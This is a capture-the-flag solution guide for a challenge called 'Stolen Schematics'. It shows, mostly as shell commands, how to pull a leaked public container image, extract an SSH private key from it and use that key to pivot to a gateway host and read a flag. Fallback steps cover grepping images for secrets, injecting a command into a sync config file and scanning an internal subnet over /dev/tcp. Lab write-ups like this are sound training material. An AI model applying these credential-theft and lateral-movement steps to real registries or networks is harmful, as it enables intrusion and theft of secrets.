# Stolen Schematics - Kali Linux Manual Solution Guide

## Prerequisites

On your **Kali Linux** machine, ensure you have:

```bash
# Install required tools
sudo apt update
sudo apt install -y docker.io sshpass openssh-client

# Start Docker service
sudo systemctl start docker
sudo systemctl enable docker

# Add your user to docker group (logout/login required)
sudo usermod -aG docker $USER
```

## Challenge Information

- **Instance**: `ssh player@instance.ctf.tdho.st -p [YOUR_PORT]`
- **Password**: `reyalp`
- **Time Limit**: 8-10 minutes
- **Flag Location**: `/etc/flag.txt` on the **gateway server** (172.27.0.1)

## Solution Steps

### Step 1: Find the Public GHCR Image

The challenge hints: "*An older build was accidentally left public on ghcr.io*"

```bash
# Try common image names
IMAGES=(
    "ghcr.io/talldwarfhosting/mc-server:latest"
    "ghcr.io/talldwarfhosting/mc-server:v1"
    "ghcr.io/talldwarfhosting/mc-server:v0.1"
    "ghcr.io/talldwarfhosting/minecraft-server:v1"
    "ghcr.io/talldwarfhosting/game-server:v1"
)

# Test each one
for img in "${IMAGES[@]}"; do
    echo "Testing: $img"
    docker pull "$img" 2>&1 | grep -E "Downloaded|up to date|not found"
done
```

**Expected output when found:**
```
Testing: ghcr.io/talldwarfhosting/mc-server:v1
Downloaded newer image for ghcr.io/talldwarfhosting/mc-server:v1
```

### Step 2: Extract SSH Key from the Image

Once you find the public image:

```bash
# Example: if mc-server:v1 worked
IMAGE="ghcr.io/talldwarfhosting/mc-server:v1"

# Method 1: Check /root/.ssh/ (most likely location)
docker run --rm "$IMAGE" cat /root/.ssh/id_rsa > /tmp/stolen_key

# Method 2: If not found, search entire filesystem
docker run --rm "$IMAGE" find / -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null

# Extract from found location (example: /home/player/.ssh/id_rsa)
docker run --rm "$IMAGE" cat /home/player/.ssh/id_rsa > /tmp/stolen_key

# Set proper permissions
chmod 600 /tmp/stolen_key

# Verify it's a valid SSH key
head -1 /tmp/stolen_key
# Should show: -----BEGIN RSA PRIVATE KEY----- or similar
```

### Step 3: Connect to Challenge Instance

```bash
# Update with your instance port
INSTANCE_PORT="32881"  # Change this!

# Test connection
ssh -p $INSTANCE_PORT player@instance.ctf.tdho.st
# Password: reyalp
```

### Step 4: Upload the SSH Key

**Option A - Using SCP:**
```bash
scp -P $INSTANCE_PORT /tmp/stolen_key player@instance.ctf.tdho.st:/tmp/key
```

**Option B - Using SSH + paste:**
```bash
# Copy key content
cat /tmp/stolen_key

# SSH to container
ssh -p $INSTANCE_PORT player@instance.ctf.tdho.st

# Inside container, paste the key
cat > /tmp/key << 'EOF'
-----BEGIN RSA PRIVATE KEY-----
[paste key content here]
-----END RSA PRIVATE KEY-----
EOF

chmod 600 /tmp/key
```

### Step 5: SSH to Gateway and Get Flag

**Inside the container:**

```bash
# SSH from container to gateway using the stolen key
ssh -i /tmp/key -o StrictHostKeyChecking=no player@172.27.0.1

# Once connected to gateway:
cat /etc/flag.txt
# or
cat flag.txt
```

**One-liner from Kali (entire exploit chain):**
```bash
INSTANCE_PORT="32881"  # Update this

ssh -p $INSTANCE_PORT player@instance.ctf.tdho.st \
  'chmod 600 /tmp/key && ssh -i /tmp/key -o StrictHostKeyChecking=no player@172.27.0.1 "cat /etc/flag.txt"'
```

**Fully automated from Kali:**
```bash
INSTANCE_PORT="32881"  # Update this

# Upload key and get flag in one command
sshpass -p "reyalp" scp -P $INSTANCE_PORT /tmp/stolen_key player@instance.ctf.tdho.st:/tmp/key && \
sshpass -p "reyalp" ssh -p $INSTANCE_PORT player@instance.ctf.tdho.st \
  'chmod 600 /tmp/key && ssh -i /tmp/key -o StrictHostKeyChecking=no player@172.27.0.1 "cat /etc/flag.txt"'
```

## Quick Reference: Complete Command Sequence

```bash
# 1. Find and pull public image
docker pull ghcr.io/talldwarfhosting/mc-server:v1

# 2. Extract SSH key
docker run --rm ghcr.io/talldwarfhosting/mc-server:v1 \
  cat /root/.ssh/id_rsa > /tmp/stolen_key
chmod 600 /tmp/stolen_key

# 3. Set instance port (UPDATE THIS!)
export INSTANCE_PORT="32881"

# 4. Upload key and exploit
sshpass -p "reyalp" scp -o StrictHostKeyChecking=no \
  -P $INSTANCE_PORT /tmp/stolen_key \
  player@instance.ctf.tdho.st:/tmp/key

# 5. Get the flag
sshpass -p "reyalp" ssh -o StrictHostKeyChecking=no \
  -p $INSTANCE_PORT player@instance.ctf.tdho.st \
  'chmod 600 /tmp/key && ssh -i /tmp/key -o StrictHostKeyChecking=no player@172.27.0.1 "cat /etc/flag.txt"'
```

## Troubleshooting

### Problem: "docker: command not found"
```bash
sudo apt install docker.io
sudo systemctl start docker
sudo usermod -aG docker $USER
# Log out and back in
```

### Problem: "permission denied" when running docker
```bash
# Use sudo
sudo docker pull ghcr.io/talldwarfhosting/mc-server:v1

# OR add yourself to docker group
sudo usermod -aG docker $USER
# Log out and log back in
```

### Problem: "manifest unknown" or "not found"
```
The image name or tag is wrong. Try other combinations:
- Different tags: :latest, :v1, :v0.1, :old, :dev
- Different names: mc-server, minecraft-server, game-server, server
```

### Problem: "sshpass: command not found"
```bash
sudo apt install sshpass
```

### Problem: Instance has expired
```
Challenge instances expire after 8-10 minutes.
Request a new instance and update the port number.
```

### Problem: "Permission denied (publickey)" when SSHing to gateway
```
This means the SSH key from the image didn't work.
Possible causes:
1. Wrong image (find the correct one)
2. Key at different location in image
3. Wrong username (try 'root' instead of 'player')
```

### Problem: Can't find the public image
```bash
# Try to list packages via GitHub API (may require auth)
curl https://api.github.com/orgs/TallDwarfHosting/packages?package_type=container

# Or check GitHub packages page manually:
# https://github.com/orgs/TallDwarfHosting/packages

# Try accessing the ghcr.io API directly
curl -s https://ghcr.io/v2/talldwarfhosting/mc-server/tags/list
```

## Alternative Approaches (If SSH Key Method Fails)

### A. Try to find credentials in the image
```bash
# Search for passwords, secrets
docker run --rm $IMAGE grep -r "password\|secret\|credential" /opt /etc 2>/dev/null

# Check environment variables
docker run --rm $IMAGE env

# Check for .env files
docker run --rm $IMAGE find / -name '.env' 2>/dev/null | xargs docker run --rm $IMAGE cat
```

### B. Exploit the sync mechanism
```bash
# Connect to container
ssh -p $INSTANCE_PORT player@instance.ctf.tdho.st

# Try to exploit sync-loop.sh by writing to config
echo 'exec=cat /etc/flag.txt > /tmp/flag' >> /opt/mc/config/sync-request.conf

# Wait a few seconds
sleep 5

# Check output
cat /tmp/flag
```

### C. Check for other containers/services
```bash
# Inside container, scan for other hosts
for i in {1..10}; do
    timeout 1 bash -c "echo >/dev/tcp/172.27.0.$i/22" 2>&1 && echo "172.27.0.$i:22 OPEN"
done

# Try HTTP services on gateway
wget -q -O- http://172.27.0.1/ 2>&1
wget -q -O- http://172.27.0.1:8080/ 2>&1
```

## Flag Format

```
TDHT{...}
```

Example: `TDHT{container_escape_via_leaked_ssh_key_in_public_registry}`

## Time-Saving Tips

1. **Pre-download common tools on Kali before starting instance**
2. **Have Docker already running**
3. **Test image names in parallel** using background jobs:
   ```bash
   for img in "${IMAGES[@]}"; do
       (docker pull "$img" 2>&1 | grep -q "Downloaded" && echo "FOUND: $img") &
   done
   wait
   ```
4. **Create a script beforehand** - use the automated script provided
5. **Work fast** - you only have 8-10 minutes

## Success Indicators

✅ Found public Docker image  
✅ Extracted SSH private key  
✅ Uploaded key to container  
✅ Successfully SSH'd to gateway (172.27.0.1)  
✅ Retrieved flag from `/etc/flag.txt`

---

## Automation Script

Use the provided `KALI_LINUX_SOLUTION.sh` script:

```bash
# Make it executable
chmod +x KALI_LINUX_SOLUTION.sh

# Edit the instance port
nano KALI_LINUX_SOLUTION.sh
# Change: INSTANCE_PORT="32881" to your actual port

# Run it
./KALI_LINUX_SOLUTION.sh
```

---

**Author**: CTF Solver  
**Challenge**: Stolen Schematics (350pts)  
**Category**: Container Escape / Cloud Security  
**CTF**: TallDwarfHosting
